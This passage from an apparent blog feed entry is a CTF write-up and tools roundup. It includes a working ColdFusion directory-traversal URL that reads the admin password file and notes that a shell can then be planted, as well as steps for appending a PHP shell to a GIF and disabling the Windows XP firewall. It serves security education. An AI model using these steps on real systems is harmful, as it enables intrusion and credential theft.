&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;All&lt;/span&gt; &lt;span class="n"&gt;versions&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="c1"&gt;//site/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\..\..\JRun4\servers\cfusion\cfusion-ear\cfusion-war\WEB-INF\cfusion\lib\password.properties%00en&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;Now a shell can be written to a file and added in &lt;strong&gt;Schedule New Task&lt;/strong&gt;. See detailed instructions at &lt;a href="http://www.blackhatlibrary.net/Coldfusion_hacking"&gt;blackhatlib&lt;/a&gt;, at &lt;a href="http://www.infointox.net/?p=59"&gt;infointox&lt;/a&gt;, at &lt;a href="http://www.gnucitizen.org/blog/coldfusion-directory-traversal-faq-cve-2010-2861/"&gt;gnucitizen&lt;/a&gt;, at &lt;a href="http://kaoticcreations.blogspot.com/2012/11/hacking-cold-fusion-servers-part-i.html"&gt;kaoticcreations&lt;/a&gt;, at &lt;a href="https://www.cyberguerrilla.org/blog/?p=18275"&gt;cyberguerilla&lt;/a&gt;, at &lt;a href="http://jumpespjump.blogspot.com/2014/03/attacking-adobe-coldfusion.html"&gt;jumpespjump&lt;/a&gt;, and at &lt;a href="http://hexale.blogspot.com/2008/07/how-to-decrypt-coldfusion-datasource.html"&gt;hexale&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Useful Tools&lt;/h2&gt;
&lt;h3&gt;Vulnerability Scanners&lt;/h3&gt;
&lt;p&gt;Vulnerability scanners can be useful for several problems. For instance, for a PHP static source code analyser, we can use &lt;a href="http://rips-scanner.sourceforge.net/"&gt;RIPS&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;In this CTF we had to scan for &lt;a href="http://en.wikipedia.org/wiki/Heartbleed"&gt;Heartbleed&lt;/a&gt;, and we used &lt;a href="https://gist.githubusercontent.com/eelsivart/10174134/raw/5c4306a11fadeba9d9f9385cdda689754ca4d362/heartbleed.py"&gt;this script&lt;/a&gt;.&lt;/p&gt;
&lt;h3&gt;Scapy&lt;/h3&gt;
&lt;p&gt;&lt;a href="http://packetlife.net/blog/2011/may/23/introduction-scapy/"&gt;Scapy&lt;/a&gt; is a Python lib for crafting packets. It can be useful for problems such as &lt;a href="http://en.wikipedia.org/wiki/Port_knocking"&gt;port knocking&lt;/a&gt;. For illustration, check this &lt;a href="http://eindbazen.net/2011/12/phd-ctf-quals-2011-%E2%80%93-port-knocking/"&gt;example from PHD CTF 2011&lt;/a&gt; and this from &lt;a href="http://blog.dul.ac/2014/05/ASISCTF14/"&gt;ASIS CTF 2014&lt;/a&gt;. Check &lt;a href="https://code.google.com/p/pypk/source/browse/branches/release-0.1.0/knocker.py?r=3"&gt;this project&lt;/a&gt; too.&lt;/p&gt;
&lt;h3&gt;Steganography&lt;/h3&gt;
&lt;p&gt;One of the questions had a reference to the &lt;a href="https://ccrma.stanford.edu/~eberdahl/Projects/Paranoia/"&gt;paranoia.jar&lt;/a&gt; tool, which hides text in an image file using &lt;a href="http://en.wikipedia.org/wiki/Advanced_Encryption_Standard"&gt;128 bit AES&lt;/a&gt; encryption.&lt;/p&gt;
&lt;p&gt;To run the tool (after downloading it) just do:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;java -jar paranoia.jar
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;HTTP/HTTPS Request Tampering&lt;/h3&gt;
&lt;p&gt;Very useful for the RFI problems (but not limited to them):&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://addons.mozilla.org/en-US/firefox/addon/tamper-data/"&gt;Tamper Data&lt;/a&gt;: view and modify HTTP/HTTPS headers.&lt;/li&gt;
&lt;li&gt;&lt;a href="http://portswigger.net/burp/"&gt;Burp&lt;/a&gt;: a Java application to secure or penetrate web applications.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Wireshark&lt;/h3&gt;
&lt;p&gt;At some point I'm going to dedicate an entire post for &lt;a href="https://www.wireshark.org/"&gt;Wireshark&lt;/a&gt;, but for this CTF the important things to know were:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Look for POST requests:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;method&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;POST&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;Submit the found data (same username, nonce, and password) with the command:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;curl&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;user&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;manager&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;nonce&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;7413734&lt;/span&gt;&lt;span class="n"&gt;ab666ce02cf27c9862c96a8e7&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;pass&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="n"&gt;ecd6317a873b18e7dde351ac094ee3b&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt; &lt;span class="n"&gt;HOST&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;&lt;a href="http://en.wikipedia.org/wiki/Exchangeable_image_file_format"&gt;Exif&lt;/a&gt; data extractor:&lt;/h3&gt;
&lt;p&gt;&lt;a href="http://www.sno.phy.queensu.ca/~phil/exiftool/index.html"&gt;ExifTool&lt;/a&gt;  is used for reading, writing, and manipulating image metadata:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;tar -xf Image-ExifTool-9.74.tar.gz
&lt;span class="nv"&gt;$ &lt;/span&gt; &lt;span class="nb"&gt;cd &lt;/span&gt;Image-ExifTool-9.74/
&lt;span class="nv"&gt;$ &lt;/span&gt;perl Makefile.PL
&lt;span class="nv"&gt;$ &lt;/span&gt;make &lt;span class="nb"&gt;test&lt;/span&gt;
&lt;span class="nv"&gt;$ &lt;/span&gt;sudo make install
&lt;span class="nv"&gt;$ &lt;/span&gt;exiftool IMAGEFILE
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;MD5 Lookups&lt;/h3&gt;
&lt;p&gt;Several hashes in this CTF needed to be searched. Google in general does a good job, but here are some specific websites: &lt;a href="http://hash-killer.com/"&gt;hash-killer&lt;/a&gt; and &lt;a href="http://www.md5this.com/"&gt;md5this&lt;/a&gt;.&lt;/p&gt;
&lt;h3&gt;In the Shell&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Hexadecimal decoders&lt;/strong&gt; are essential. You can use Python's &lt;a href="https://docs.python.org/2/library/functions.html#hex"&gt;hex&lt;/a&gt;:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;python -c &lt;span class="s1"&gt;&amp;#39;print &amp;quot;2f722f6e6574736563&amp;quot;.decode(&amp;quot;hex&amp;quot;)&amp;#39;&lt;/span&gt;
/r/netsec
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;or command line &lt;a href="http://linuxcommand.org/man_pages/xxd1.html"&gt;xxd&lt;/a&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;yum install vim-common
&lt;span class="nv"&gt;$ &lt;/span&gt;xxd -r -p &lt;span class="o"&gt;&amp;lt;&amp;lt;&amp;lt;&lt;/span&gt; 2f722f6e6574736563
/r/netsec
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Base64 decoders&lt;/strong&gt; are also essential:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;base64 --decode &lt;span class="o"&gt;&amp;lt;&amp;lt;&amp;lt;&lt;/span&gt; BASE64STRING &amp;gt; OUTPUT
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;nmap&lt;/strong&gt;, obviously. You can use it in Python scripts, using the &lt;a href="https://docs.python.org/2/library/subprocess.html"&gt;subprocess&lt;/a&gt; library:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;[*] Scanning for open ports using nmap&amp;quot;&lt;/span&gt;
&lt;span class="n"&gt;subprocess&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;call&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;nmap -sS -sV -T4 -p 22-2048 &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;base_URL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;shell&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;tee&lt;/strong&gt; is nice to store and view the output of another command. It can be very useful with &lt;em&gt;curl&lt;/em&gt;. A simple  example:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;ls | tee file
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;chattr&lt;/strong&gt; is used to change the file attributes of a Linux file system. For example, the command &lt;code&gt;chattr +i&lt;/code&gt; on a file make it not be able to be removed (useful for &lt;em&gt;zombie&lt;/em&gt; processes hunting).&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;nm&lt;/strong&gt; is useful for listing symbols from object files&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;md5 hashing&lt;/strong&gt; is used all the time:&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; -n password | md5sum
5f4dcc3b5aa765d61d8327deb882cf99
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;You might want to &lt;strong&gt;append a shell code to an image&lt;/strong&gt; (for example, a GIF file):&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;cat PHP-shell.php &amp;gt;&amp;gt; fig.gif
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;Now a special one: Windows! One of the trivia questions in this CTF. How to disable the Windows XP Firewall from command line:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;netsh firewall &lt;span class="nb"&gt;set &lt;/span&gt;opmode &lt;span class="nv"&gt;mode&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;DISABLE.
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;p&gt;&lt;strong&gt;That's it. Hack all the things!&lt;/strong&gt;&lt;/p&gt;</summary><category term="Linux"></category><category term="RFI"></category><category term="SQL_injection"></category><category term="LFI"></category><category term="RCE"></category><category term="PHP"></category><category term="CMS"></category><category term="ApPHP"></category><category term="unoconv"></category><category term="ColdFusion"></category><category term="Buffer_Overflow"></category><category term="Steganography"></category><category term="Wireshark"></category><category term="ExifTool"></category><category term="netsh"></category><category term="CTF"></category><category term="scapy"></category><category term="RIPS"></category><category term="Heartbleed"></category><category term="nmap"></category></entry></feed>